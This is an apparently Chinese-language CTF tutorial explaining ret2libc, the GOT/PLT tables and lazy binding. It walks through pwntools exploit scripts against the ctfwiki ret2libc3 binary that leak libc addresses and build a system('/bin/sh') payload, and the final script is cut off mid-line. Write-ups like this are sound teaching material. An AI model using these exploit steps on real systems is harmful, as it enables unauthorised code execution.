---
title: Pwn入门之ret2libc详解
url: https://www.secpulse.com/archives/196991.html
source: 安全脉搏
date: 2023-03-07
fetch_date: 2025-10-04T08:47:52.034401
---

# Pwn入门之ret2libc详解

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# Pwn入门之ret2libc详解

[CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)

[TideSec](https://www.secpulse.com/newpage/author?author_id=26366)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2023-03-06

19,407

# 前言

之前曾在Pwn入门之基础栈溢出里面曾经提过ret2libc的相关知识，但是写的比较笼统，感觉对新手还是不够友好，想通过本文对ret2libc的原理和利用进行详细讲解。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196991-1678081440.jpeg "null")

# 前置知识

## GOT表和PLT表

got表也叫全局偏移表（Global Offset Table）是Linux ELF文件中用于定位全局变量和函数的一个表。

plt表也叫过程链接表（Procedure Linkage Table）是Linux ELF文件中用于延迟绑定的表恶，即函数第一次被调用的时候才进行绑定。

在程序运行过程中，plt表和got表的运行过程大致如下：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196991-1678081441.png "null")

用一句话来总结就是，可执行文件里保存的是plt表的地址，对应plt地址指向的是got的地址，got表指向的是glibc中的地址

在这里如果需要通过plt表获取函数的地址，需要保证got表已经获取了正确的地址，但如果一开始对所有函数都进行了重定位是比较麻烦且浪费资源，为此，Linux引入了延迟绑定机制。

## 延迟绑定

这种机制存在的目的是glibc为了节约系统资源，提高性能。其详细过程如下

源程序在第一次调用一个函数时，首先去

如果存在一个tide函数，这个函数在plt中的条目为tide@plt，在got中的条目为tide@got，那么在第一次调用bar函数时，首先会跳转到plt，伪代码如下：

```
tide@plt;
jmp tide@got
patch tide@got
```

这里会从PLT跳到GOT，如果函数从来没有调用过，那这时GOT会跳转回PLT并调用patch tide@got，这行代码的作用是将bar函数真正的地址填充到tide@got，然后跳转到bar函数真正的地址执行代码。当下次再次调用bar函数的时候，执行路径就是先跳转到tide@plt、tide@got、tide真正的地址。

简而言之就是，当一个函数被调用过后，got表里保存了他在内存中的地址，可以通过泄漏got表内存来泄漏函数地址，然后可以根据起泄漏的函数地址获得其libc版本，从而计算其他函数在内存空间中的地址。因为libc中任意两个函数之间的偏移是固定的。

以计算system函数在内存空间中的函数地址举例。

1. 1. 获取`__libc_start_main`函数在内存空间中的地址`addr_main`
2. 2. `__libc_start_main`函数相对于`libc.so.6`的起始地址是`addr_main_offset`
3. 3. system函数相对于`libc.so.6`的起始地址是`addr_system_offset`
4. 4. 则`system`函数在内存中真正的地址为`addr_main`+`addr_system_offset`-`addr_main_offset`

在我们ret2libc中我们只需要理解为，只有执行过的函数，我们才能通过got表泄漏其地址。

# 基本思路

ret2libc是控制函数执行libc中的函数，通常是返回至某个函数的plt处。一般情况下，会选择执行system('/bin/sh')，因此需要找到system函数的地址

看到这里相信有的师傅就会问了，为什么不能直接跳到got表，通过前面的前置知识我们知道plt表中的地址对应的是指令，got表中的地址对应的是指令地址，而返回地址必须保存一段有效的汇编指令，所以必须要用plt表

ret2libc通常可以分为下面几种类型：

* • 程序中自身包含system函数和"/bin/sh"字符串
* • 程序中自身就有system函数，但是没有"/bin/sh"字符串
* • 程序中自身没有syetem函数和"/bin/sh"字符串，但给出了libc.so文件
* • 程序中自身没有sysetm函数和"/bin/sh"字符串，并且没有给出libc.so文件

针对前面那三种在前面的文章中已经进行过详细讲解，本文主要是针对第四种情况进行讲解

对于没有给出libc.so文件的程序，我们可以通过泄漏出程序当中的某个函数的地址，通过查询来找出其中使用lib.so版本是哪一个，然后根据lib.so的版本去找到我们需要的system函数的地址。

针对常见的题目我们的解题思路是这样的：

1. 1. 利用栈溢出及puts函数泄漏出在got表中`__libc_start_main`函数的地址
2. 2. puts函数的返回地址为\_start函数
3. 3. 利用最低的12位找出libc版本（即使程序有ASLR保护，也只是针对地址中间位进行随机，最低的12位并不会发生改变）
4. 4. 利用找到的libc版本计算system函数和/bin/sh字符串在内存中的正确的地址

# 实战

我们还是利用ctfwiki中的ret2libc3进行讲解

分析程序

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196991-1678081442.png "null")

根据前面分析的，我们需要找到如下几个地址

* • `__libc_start_main`函数在got表的地址
* • `_start`函数的地址
* • `puts`函数在`plt`表中的地址

`__libc_start_main`函数在got表中的地址

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196991-1678081444.png "null")

`_start`函数的地址

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196991-1678081449.png "null")

`puts`函数在`plt`表中的地址

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196991-1678081452.png "null")

获取到这三个地址后，我们可以采用调用`puts`函数后，`ret`到`main`函数，用`main`函数里面的`gets`来获取`libc_start`的地址

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196991-1678081467.png "null")

获取libc\_start地址的脚本如下

```
from pwn import *
sh = process('./ret2libc3')
puts_plt = 0x8048460
addr_start = 0x80484d0
got_libc_start = 0x804a024
payload = 112 * b'a' + p32(puts_plt) + p32(addr_start) + p32(got_libc_start)
sh.recv()
sh.sendline(payload)
puts_addr = u32(sh.recv(4))
success("__libc_start_addr is:" + hex(puts_addr))
sh.recv()
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196991-1678081470.png "null")

即使程序有ASLR保护，也只是针对地址中间位进行随机，最低的12位并不会发生改变，在16进制中也就是我们的最后3位，因此cd0是不会变，使用`libc database search`(https://libc.blukat.me/)进行查询（网上普遍推荐的是利用LibcSearcher，但是我用LibcSearcher一直没打通）

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196991-1678081473.png "null")

看到这么多libc版本挨个试可能会累死，于是再来泄漏个`puts`的地址

```
from pwn import *

sh = process('./ret2libc3')
puts_plt = 0x8048460
addr_start = 0x80484d0
got_libc_start = 0x804a024
got_puts = 0x804a018

# 获取__libc_start的地址
payload1 = 112 * b'a' + p32(puts_plt) + p32(addr_start) + p32(got_libc_start)
sh.recv()
sh.sendline(payload1)
libc_start_addr = u32(sh.recv(4))
success("__libc_start_addr is:" + hex(libc_start_addr))
# 获取puts的地址
payload2 = 112 * b'a' + p32(puts_plt) + p32(addr_start) + p32(got_puts)
sh.recv()
sh.sendline(payload2)
puts_addr = u32(sh.recv(4))
success("puts_addr is:" + hex(puts_addr))
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196991-1678081476.png "null")
![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196991-1678081481.png "null")

还剩下三个了，使用下面的脚本挨个尝试吧

```
from pwn import *

sh = process('./ret2libc3')
puts_plt = 0x8048460
addr_start = 0x80484d0
got_libc_start = 0x804a024
got_puts = 0x804a018

# 获取__libc_start的地址
payload1 = 112 * b'a' + p32(puts_plt) + p32(addr_start) + p32(got_libc_start)
sh.recv()
sh.sendline(payload1)
libc_start_addr = u32(sh.recv(4))
success("__libc_start_addr is:" + hex(libc_start_addr))
# 获取puts的地址
payload2 = 112 * b'a' + p32(puts_plt) + p32(addr_start) + p32(got_puts)
sh.recv()
sh.sendline(payload2)
puts_addr = u32(sh.recv(4))
success("puts_addr is:" + hex(puts_addr))
sh.recv()

libc_start = #通过libc database search获取
libc_system = #通过libc database search获取
libc_binsh = #通过libc database search获取

libcbase = libc_start_addr - libc_start
system_addr = libcbase + libc_syste...